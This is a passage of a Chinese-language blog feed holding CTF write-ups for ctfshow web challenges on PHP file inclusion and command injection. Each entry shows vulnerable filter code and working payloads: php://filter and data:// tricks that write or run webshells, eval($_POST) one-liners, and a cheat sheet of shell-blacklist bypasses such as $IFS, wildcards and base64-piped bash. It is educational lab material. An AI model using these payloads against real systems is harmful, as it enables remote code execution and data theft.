class="string">"&lt;?php die('大佬别秀了');?&gt;"</span>.$content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的知识点，<code>https://www.leavesongs.com/PENETRATION/php-filter-magic.html</code>，很详细</p><p>使用base64进行绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?file=php:<span class="comment">//filter/write=convert.base64-decode/resource=xxx.php</span></span><br><span class="line">POST: content=aaPD9waHAgIGV2YWwoJF9QT1NUWzFdKTs%<span class="number">2</span>FPg%<span class="number">3</span>D%<span class="number">3</span>D</span><br><span class="line">进行url双编码</span><br><span class="line">通过base64过滤之后就只有(phpdie)<span class="number">6</span>个字符我们就要添加<span class="number">2</span>个字符让前面的可以进行编码，bases64，<span class="number">4</span>个字符一组</span><br></pre></td></tr></table></figure><img src="/2020/09/24/filecontains/2.png" class=""><p>之后再访问写入的文件路径，即可以进行命令执行</p><img src="/2020/09/24/filecontains/3.png" class=""><h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i"</span>, $file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"error"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br></pre></td></tr></table></figure><p>作了很多的过滤，但是冒号被放出来了，依旧可以用data协议，这里注意到等号被过滤了，加密之后的内容赋值时去掉等号即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw</span></span><br><span class="line">file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs</span></span><br></pre></td></tr></table></figure><h3 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h3><p>开题是个视频，下载，foremost拿到一张源码图片</p><img src="/2020/09/24/filecontains/4.png" class=""><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/read=/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i'</span>,$x))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'too young too simple sometimes naive!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">$contents=$_POST[<span class="string">'contents'</span>];</span><br><span class="line">filter($file);</span><br><span class="line">file_put_contents($file, <span class="string">"&lt;?php die();?&gt;"</span>.$contents);</span><br></pre></td></tr></table></figure><p>使用其他的过滤器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/convert.iconv.UCS-2LE.UCS-2BE/resource=1.php</span></span><br><span class="line">post：contents=?&lt;hp pe@av(l_$OPTSQ[tf]m;)&gt;?</span><br><span class="line">    </span><br><span class="line">再访问<span class="number">1.</span>php，利用shell</span><br><span class="line">Qftm=system(<span class="string">'cat flag.php'</span>);</span><br><span class="line"></span><br><span class="line">附上文章：https:<span class="comment">//www.anquanke.com/post/id/202510#h3-15</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshowcommand</title>
      <link href="/2020/09/22/ctfshowcommand/"/>
      <url>/2020/09/22/ctfshowcommand/</url>
      
        <content type="html"><![CDATA[<h3 id="command绕过"><a href="#command绕过" class="headerlink" title="command绕过"></a>command绕过<a id="more"></a></h3><h4 id="知识总结，写在前面"><a href="#知识总结，写在前面" class="headerlink" title="知识总结，写在前面"></a>知识总结，写在前面</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">分隔命令</span><br><span class="line">;<span class="comment">//分号应该是最好理解的</span></span><br><span class="line">|<span class="comment">//只执行后面那条命令</span></span><br><span class="line">||<span class="comment">//只执行前面那条命令</span></span><br><span class="line">&amp;<span class="comment">//两条命令都会执行，不知道是不是自己姿势不对，没成功，下面也是一样</span></span><br><span class="line">&amp;&amp;<span class="comment">//两条命令都会执行</span></span><br><span class="line"></span><br><span class="line">空格绕过</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;<span class="comment">//需要写的权限</span></span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$<span class="number">9</span></span><br><span class="line">%<span class="number">20</span></span><br><span class="line">%<span class="number">09</span></span><br><span class="line">%<span class="number">3</span>c</span><br><span class="line">A=$<span class="string">'cat\x20flag'</span>&amp;&amp;$A</span><br><span class="line">A=$<span class="string">'cat\x09flag'</span>&amp;&amp;$A</span><br><span class="line">黑名单</span><br><span class="line"><span class="comment">//一般情况像flag、php这种字符会被ban掉，这时候就需要进行绕过了</span></span><br><span class="line">通配符</span><br><span class="line">*<span class="comment">//匹配任何文本或字符串，这个通过测试发现并不能与IFS或&lt;这两个字符一起使用</span></span><br><span class="line">?<span class="comment">//匹配单个任意字符</span></span><br><span class="line"> </span><br><span class="line">空字符</span><br><span class="line">$@<span class="comment">//ca$@t flag</span></span><br><span class="line">$<span class="number">1</span>-$<span class="number">9</span><span class="comment">//ca$1t flag</span></span><br><span class="line">$&#123;数字&#125;  <span class="comment">//ca$&#123;1&#125;t flag</span></span><br><span class="line"> </span><br><span class="line">编码绕过</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Y2F0IGZsYWcucGhwCg=="</span>|base64 -d|bash<span class="comment">//解码为cat flag.php并执行</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"cat flag.php"</span>|base64<span class="comment">//最好别在在线网站编码，不然可能会将空格转成url编码，从而无法执行命令</span></span><br><span class="line"> </span><br><span class="line">变量替换</span><br><span class="line">a=t;b=g;ca$a fla$b.php</span><br><span class="line"> </span><br><span class="line">引号</span><br><span class="line">ca<span class="string">''</span>t fl<span class="string">''</span>ag.php</span><br><span class="line"></span><br><span class="line">反斜杆</span><br><span class="line"></span><br><span class="line">ca\t f\la\g.php</span><br><span class="line">Linux查看文件命令</span><br><span class="line">cat<span class="comment">//cat flag.php</span></span><br><span class="line">tac<span class="comment">//tac flag.php</span></span><br><span class="line">head<span class="comment">//head flag.php</span></span><br><span class="line">tail<span class="comment">//tail flag.php</span></span><br><span class="line">nl<span class="comment">//nl flag.php</span></span><br><span class="line">more<span class="comment">//more flag.php</span></span><br><span class="line">less<span class="comment">//less flag.php</span></span><br><span class="line">od<span class="comment">//od flag.php</span></span><br><span class="line">grep<span class="comment">//grep 'fla' flag.php</span></span><br><span class="line">strings<span class="comment">//strings flag.php</span></span><br><span class="line">sort<span class="comment">//sort flag.php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)</span><br><span class="line">pos()：返回数组中的当前元素的值。</span><br><span class="line">array_reverse()：数组逆序</span><br><span class="line">scandir()：获取目录下的文件</span><br><span class="line">next()： 函数将内部指针指向数组中的下一个元素，并输出。</span><br></pre></td></tr></table></figure><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/flag/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单过滤了flag,用通配符即可绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=system(<span class="string">"ls"</span>);</span><br><span class="line">c=system(<span class="string">'cat f*'</span>);</span><br></pre></td></tr></table></figure><p>下面的题目都只放核心部分</p><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag|system|php/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以发现这里过滤了php和system,影响不大，system的替代函数有很多，像是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">exec()</span><br><span class="line"><span class="comment">#这里要注意除了system都是不会给出回显的，要用诸如echo,print_r等来带出结果</span></span><br></pre></td></tr></table></figure><p>不查看目录结构直接盲猜文件位置也是可以的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=<span class="keyword">echo</span> exec(<span class="string">'find / -name f*'</span>);</span><br><span class="line">c=<span class="keyword">echo</span> exec(<span class="string">'cat f*'</span>);</span><br></pre></td></tr></table></figure><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>新加了几个过滤，cat,sort,shell,空格等，还是很好绕过的，上面的知识总结里有，这里就不赘述了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=<span class="keyword">echo</span>(`ls`);</span><br><span class="line">c=<span class="keyword">echo</span>(`c\at%<span class="number">09</span>f*`);</span><br></pre></td></tr></table></figure><h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这题过滤的东西变多了，单引号，分号，打印echo等都被过滤了</p><p>这里可以尝试包含</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=<span class="keyword">include</span><span class="string">"/etc/passwd"</span><span class="meta">?&gt;</span></span><br><span class="line">可以成功执行，考虑写入小🐎</span><br><span class="line">c=<span class="keyword">include</span><span class="string">"$_POST[1]"</span><span class="meta">?&gt;</span></span><br><span class="line">POST:<span class="number">1</span>=/etc/passwd</span><br><span class="line">最后可以用伪协议</span><br><span class="line">c=<span class="keyword">include</span><span class="string">"$_POST[1]"</span><span class="meta">?&gt;</span></span><br><span class="line">POST:php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="web33-35-payload同web32，过滤基本相同"><a href="#web33-35-payload同web32，过滤基本相同" class="headerlink" title="web33-35(payload同web32，过滤基本相同)"></a>web33-35(payload同web32，过滤基本相同)</h3><h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><p>多过滤了数字，post传递的参数换成字母即可</p><h3 id="web37-同39"><a href="#web37-同39" class="headerlink" title="web37(同39)"></a>web37(同39)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>换了形式的代码，这里会对输入进行包含，这里第一反应就是写入小马，也就是利用一句话</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#paylaod</span></span><br><span class="line">c=data:text/plain,<span class="meta">&lt;?php</span> system(<span class="string">'ls'</span>)<span class="meta">?&gt;</span></span><br><span class="line">c=data:text/plain,<span class="meta">&lt;?php</span> system(<span class="string">'cat f*'</span>)<span class="meta">?&gt;</span></span><br><span class="line">相当于执行了php语句<span class="meta">&lt;?php</span> system(<span class="string">'cat f*'</span>)<span class="meta">?&gt;</span>.php</span><br><span class="line">因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上</span><br></pre></td></tr></table></figure><h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag|php|file/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里还是能够用data伪协议绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=data:text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure><p>还可以在UA写入一句话，包含日志文件</p><h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\'|\"|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>除了字母，一些特殊字符基本都被过滤了</p><p>这道题和GXY禁止套娃解法相同，利用特殊的函数进行绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line">c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">具体函数功能看最前部分</span><br></pre></td></tr></table></figure><h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里涉及到linux命令中的分隔符，前面总结中有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=ls;</span><br><span class="line">c=cat flag.php;||c=cat f*;</span><br></pre></td></tr></table></figure><h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>过滤了分隔符引号和文本读取cat</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=ls||</span><br><span class="line">c=c\at f*||</span><br></pre></td></tr></table></figure><h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/;|cat|flag/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>多过滤了flag，通配符即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=ls||</span><br><span class="line">c=c\at f*||</span><br></pre></td></tr></table></figure><h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| /i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>多了个空格被过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at%<span class="number">09</span>f*||</span><br></pre></td></tr></table></figure><h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*/i"</span>, $c))&#123;</span><br><span class="line">    system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>增加数字过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br><span class="line">c=nl&lt;fl<span class="string">''</span>ag.php||</span><br></pre></td></tr></table></figure><h3 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>上题的payload能打通</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br></pre></td></tr></table></figure><h3 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>同上题payload，增加的过滤无影响</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br></pre></td></tr></table></figure><h3 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>多过滤了百分号，同上题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br></pre></td></tr></table></figure><h3 id="web50-51"><a href="#web50-51" class="headerlink" title="web50-51"></a>web50-51</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>增加十六进制对制表符等的过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br></pre></td></tr></table></figure><h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>过滤了尖括号，空格换种方式绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at$IFS/fl%<span class="number">27</span>%<span class="number">27</span>ag||</span><br></pre></td></tr></table></figure><h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">echo</span>($c);</span><br><span class="line">        $d = system($c);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>.$d;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>改变了形式，不再需要命令分隔符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at$&#123;IFS&#125;fl%<span class="number">27</span>%<span class="number">27</span>ag.php</span><br></pre></td></tr></table></figure><h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    